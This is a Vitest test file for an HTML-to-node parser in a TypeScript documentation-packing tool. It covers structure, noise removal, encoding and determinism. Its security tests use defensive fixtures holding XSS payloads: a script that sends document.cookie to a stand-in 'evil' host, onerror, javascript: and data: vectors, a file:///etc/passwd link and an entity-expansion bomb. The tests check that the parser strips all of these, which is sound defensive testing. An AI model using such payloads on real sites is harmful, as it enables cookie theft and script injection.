import { hashBytes, LoreError, type ParsedArtifact, type ParseInput } from '@lorepack/core';
import { describe, expect, it } from 'vitest';
import { declaredEncoding } from '../src/html/encoding.js';
import { htmlParser } from '../src/html/parser.js';
import { HTML_NOISE_POLICY_VERSION } from '../src/html/policy.js';

/**
 * The HTML parser, which is also the parser DOCX normalizes through (#73).
 *
 * Most of what is asserted here is about what must **not** survive. A parser that keeps
 * everything is easy; the value is in dropping site chrome and scripting while keeping the
 * document, and in never letting markup reach node text.
 */

function parse(html: string, relativePath = 'page.html'): ParsedArtifact {
  const bytes = new TextEncoder().encode(html);
  const input: ParseInput = {
    artifactId: `p:${relativePath}`,
    sourceId: 'p',
    relativePath,
    displayPath: relativePath,
    mediaType: 'text/html',
    byteSize: bytes.byteLength,
    contentHash: hashBytes(bytes),
    bytes,
  };
  return htmlParser.parse(input) as ParsedArtifact;
}

function parseBytes(bytes: Uint8Array, relativePath = 'page.html'): ParsedArtifact {
  return htmlParser.parse({
    artifactId: `p:${relativePath}`,
    sourceId: 'p',
    relativePath,
    displayPath: relativePath,
    mediaType: 'text/html',
    byteSize: bytes.byteLength,
    contentHash: hashBytes(bytes),
    bytes,
  }) as ParsedArtifact;
}

const kinds = (parsed: ParsedArtifact): string[] => parsed.nodes.map((node) => node.kind);
const texts = (parsed: ParsedArtifact): string =>
  parsed.nodes.map((node) => node.text ?? node.title ?? '').join(' | ');

describe('structure', () => {
  it('nests headings into sections with the heading path', () => {
    const parsed = parse(
      '<h1>Guide</h1><p>Intro.</p><h2>Setup</h2><p>Steps.</p><h3>Detail</h3><p>More.</p>',
    );

    const sections = parsed.nodes.filter((node) => node.kind === 'section');
    expect(sections.map((node) => node.title)).toEqual(['Guide', 'Setup', 'Detail']);

    const deepest = parsed.nodes.find((node) => node.text === 'More.');
    expect(deepest?.locator.headingPath).toEqual(['Guide', 'Setup', 'Detail']);
  });

  it('nests an h3 under an h1 rather than inventing the missing h2', () => {
    // Same rule as Markdown. Inventing an empty h2 would invent structure nobody wrote.
    const parsed = parse('<h1>Top</h1><h3>Deep</h3><p>Body.</p>');
    expect(parsed.nodes.find((node) => node.text === 'Body.')?.locator.headingPath).toEqual([
      'Top',
      'Deep',
    ]);
  });

  it('maps lists, code and tables to their own kinds', () => {
    const parsed = parse(
      '<ul><li>one</li><li>two</li></ul><pre><code>a();</code></pre><table><tr><td>x</td></tr></table>',
    );
    expect(kinds(parsed)).toEqual(['document', 'list', 'code', 'table']);
    expect(parsed.nodes[1]?.metadata).toMatchObject({ ordered: false, items: 2 });
    expect(parsed.nodes[3]?.metadata).toMatchObject({ rows: 1 });
  });

  it('keeps code text exactly, including indentation', () => {
    const parsed = parse('<pre><code class="language-bash">lore build\n  --frozen</code></pre>');
    const code = parsed.nodes.find((node) => node.kind === 'code');
    expect(code?.text).toBe('lore build\n  --frozen');
    expect(code?.metadata).toMatchObject({ language: 'bash' });
  });

  it('carries line ranges from the source file', () => {
    const parsed = parse('<html><body>\n<h1>Head</h1>\n<p>Body.</p>\n</body></html>');
    // The section, not the document: with no `<title>` the document takes the same title.
    const section = parsed.nodes.find((node) => node.kind === 'section');
    expect(section?.locator.lineStart).toBe(2);
    expect(parsed.nodes.find((node) => node.text === 'Body.')?.locator.lineStart).toBe(3);
  });

  it('takes the title from title, then a heading, then the filename', () => {
    expect(parse('<title>Declared</title><h1>Heading</h1>').artifact.title).toBe('Declared');
    expect(parse('<h1>Heading</h1>').artifact.title).toBe('Heading');
    expect(parse('<p>No title anywhere.</p>', 'notes/plain.html').artifact.title).toBe('plain');
  });
});

describe('what must not survive', () => {
  it('drops script and style with their contents', () => {
    const parsed = parse(
      '<p>Kept.</p><script>alert("stolen")</script><style>.a{color:red}</style>',
    );
    const all = JSON.stringify(parsed);
    expect(all).not.toContain('stolen');
    expect(all).not.toContain('color:red');
    expect(texts(parsed)).toContain('Kept.');
  });

  it('drops page-level navigation and footer chrome', () => {
    const parsed = parse(
      '<body><nav><a href="/x">Menu item</a></nav><main><p>Real content.</p></main><footer>Copyright notice</footer></body>',
    );
    const all = JSON.stringify(parsed);
    expect(all).not.toContain('Menu item');
    expect(all).not.toContain('Copyright notice');
    expect(all).toContain('Real content.');
  });

  /**
   * The distinction the policy exists to draw. A `header` at page level is a logo and a
   * menu; a `header` inside an `article` is that article's own opening, and dropping it
   * would remove the document's title.
   */
  it('keeps a header that belongs to the content rather than to the page', () => {
    const parsed = parse(
      '<body><header>Site name</header><article><header><h1>Article title</h1></header><p>Body.</p></article></body>',
    );
    expect(JSON.stringify(parsed)).not.toContain('Site name');
    expect(parsed.nodes.some((node) => node.title === 'Article title')).toBe(true);
  });

  it('never lets markup or attributes reach node text', () => {
    const parsed = parse(
      '<p title="attribute text" data-x="other">Visible <b>bold</b> words.</p><!-- a comment -->',
    );
    const text = parsed.nodes.find((node) => node.kind === 'paragraph')?.text;
    expect(text).toBe('Visible bold words.');
    const all = JSON.stringify(parsed);
    expect(all).not.toContain('attribute text');
    expect(all).not.toContain('a comment');
    expect(all).not.toContain('<b>');
  });

  it('keeps a link target in metadata rather than in the prose', () => {
    const parsed = parse('<p>See <a href="https://example.com/x">the guide</a>.</p>');
    const paragraph = parsed.nodes.find((node) => node.kind === 'paragraph');
    expect(paragraph?.text).toBe('See the guide.');
    expect(paragraph?.metadata).toMatchObject({ links: ['https://example.com/x'] });
  });

  it('warns when most of the page was chrome', () => {
    const parsed = parse(
      `<body><nav>${'navigation text '.repeat(50)}</nav><main><p>Tiny.</p></main></body>`,
    );
    expect(parsed.warnings.map((warning) => warning.code)).toContain('html-noise-removed');
  });
});

describe('security, per section 20.9', () => {
  it('produces no executable content from a page full of payloads', () => {
    const parsed = parse(`<body>
      <script>fetch('http://evil/'+document.cookie)</script>
      <img src="x" onerror="alert(1)">
      <a href="javascript:alert(2)">click</a>
      <iframe src="data:text/html,<script>alert(3)</script>"></iframe>
      <svg><script>alert(4)</script></svg>
      <p>Only this is content.</p>
    </body>`);

    const all = JSON.stringify(parsed);
    expect(all).not.toContain('document.cookie');
    expect(all).not.toContain('onerror');
    expect(all).not.toContain('alert(');
    expect(all).not.toContain('data:text/html');
    // The link text survives; only the `javascript:` target is carried, and as metadata
    // rather than as prose a model would read as an instruction.
    expect(all).toContain('Only this is content.');
  });

  it('references no filesystem path from the document', () => {
    const parsed = parse('<p>See <a href="file:///etc/passwd">this</a>.</p><p>../../secret</p>');
    // `../../secret` is text a document may legitimately contain; what matters is that the
    // parser resolves nothing and reads nothing from disk. The locator names only the
    // artifact it was given.
    for (const node of parsed.nodes) {
      expect(node.locator.relativePath).toBe('page.html');
      expect(node.locator).not.toHaveProperty('absolutePath');
    }
  });

  it('does not expand entities into unbounded text', () => {
    // A billion-laughs shaped document. The HTML parser has no DTD subset to expand, which
    // is the property being pinned: this must stay linear rather than becoming a bomb.
    const parsed = parse(
      `<!DOCTYPE html [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]><body><p>&b;</p></body>`,
    );
    expect(JSON.stringify(parsed).length).toBeLessThan(5000);
  });
});

describe('malformed and awkward markup', () => {
  it('recovers from unclosed tags rather than failing the artifact', () => {
    const parsed = parse('<h1>Open<p>Paragraph without closing<ul><li>item');
    expect(parsed.nodes.length).toBeGreaterThan(1);
    expect(kinds(parsed)).toContain('section');
  });

  it('handles a stray closing tag', () => {
    const parsed = parse('<p>One.</p></div></span><p>Two.</p>');
    expect(texts(parsed)).toContain('One.');
    expect(texts(parsed)).toContain('Two.');
  });

  it('reads nested tables without losing the inner rows', () => {
    const parsed = parse(
      '<table><tr><td>outer<table><tr><td>inner</td></tr></table></td></tr></table>',
    );
    const table = parsed.nodes.find((node) => node.kind === 'table');
    expect(table?.text).toContain('inner');
    // Both the outer and the inner row are counted, which is honest: there are two.
    expect(table?.metadata).toMatchObject({ rows: 2 });
  });

  it('decodes entities into their characters', () => {
    const parsed = parse('<p>Tom &amp; Jerry &lt;tags&gt; &quot;quoted&quot; caf&eacute;</p>');
    expect(parsed.nodes.find((node) => node.kind === 'paragraph')?.text).toBe(
      'Tom & Jerry <tags> "quoted" café',
    );
  });

  it('produces a document node even for an empty file', () => {
    const parsed = parse('');
    expect(parsed.nodes).toHaveLength(1);
    expect(parsed.nodes[0]?.kind).toBe('document');
  });

  it('collapses whitespace the way a browser renders it', () => {
    const parsed = parse('<p>lots\n   of\t\tspace</p>');
    expect(parsed.nodes.find((node) => node.kind === 'paragraph')?.text).toBe('lots of space');
  });
});

describe('encoding', () => {
  it('finds a declared charset in either meta form', () => {
    const utf = new TextEncoder().encode('<meta charset="utf-8">');
    expect(declaredEncoding(utf)).toBe('utf-8');
    const httpEquiv = new TextEncoder().encode(
      '<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">',
    );
    expect(declaredEncoding(httpEquiv)).toBe('windows-1252');
    expect(declaredEncoding(new TextEncoder().encode('<p>none</p>'))).toBeNull();
  });

  /**
   * The one place Lorepack decodes something other than UTF-8, and the reason is that the
   * document is *labelled* rather than guessed at. A legacy documentation export is exactly
   * the file someone points Lorepack at.
   */
  it('honours a declared legacy encoding', () => {
    // `caf\xe9` is windows-1252 for "café" and is invalid UTF-8.
    const head = '<meta charset="windows-1252"><p>caf';
    const bytes = new Uint8Array([
      ...new TextEncoder().encode(head),
      0xe9,
      ...new TextEncoder().encode('</p>'),
    ]);
    const parsed = parseBytes(bytes);
    expect(parsed.nodes.find((node) => node.kind === 'paragraph')?.text).toBe('café');
    expect(parsed.warnings.map((warning) => warning.code)).toContain('html-declared-encoding');
  });

  it('refuses undeclared bytes that are not UTF-8, rather than guessing', () => {
    const bytes = new Uint8Array([...new TextEncoder().encode('<p>caf'), 0xe9, 0x3c, 0x2f, 0x70]);
    expect(() => parseBytes(bytes)).toThrow(LoreError);
  });

  it('falls back to UTF-8 and says so when the declared label is unknown', () => {
    const parsed = parseBytes(
      new TextEncoder().encode('<meta charset="x-made-up"><p>Still readable.</p>'),
    );
    expect(parsed.warnings.map((warning) => warning.code)).toContain('html-unknown-encoding');
    expect(texts(parsed)).toContain('Still readable.');
  });
});

describe('determinism', () => {
  it('produces byte-identical output on a second parse', () => {
    const html = '<title>T</title><h1>A</h1><p>Body <a href="/x">link</a>.</p><ul><li>i</li></ul>';
    expect(JSON.stringify(parse(html))).toBe(JSON.stringify(parse(html)));
  });

  it('records the noise policy version, because it decides what the build contains', () => {
    const parsed = parse('<p>Anything.</p>');
    expect(parsed.artifact.metadata).toMatchObject({
      noisePolicyVersion: HTML_NOISE_POLICY_VERSION,
    });
  });

  it('starts every artifact neutral, leaving status and authority to the rule stage', () => {
    const parsed = parse('<p>Anything.</p>');
    expect(parsed.artifact.status).toBe('active');
    expect(parsed.artifact.authority).toBe(50);
    expect(parsed.artifact.supersedes).toEqual([]);
  });
});
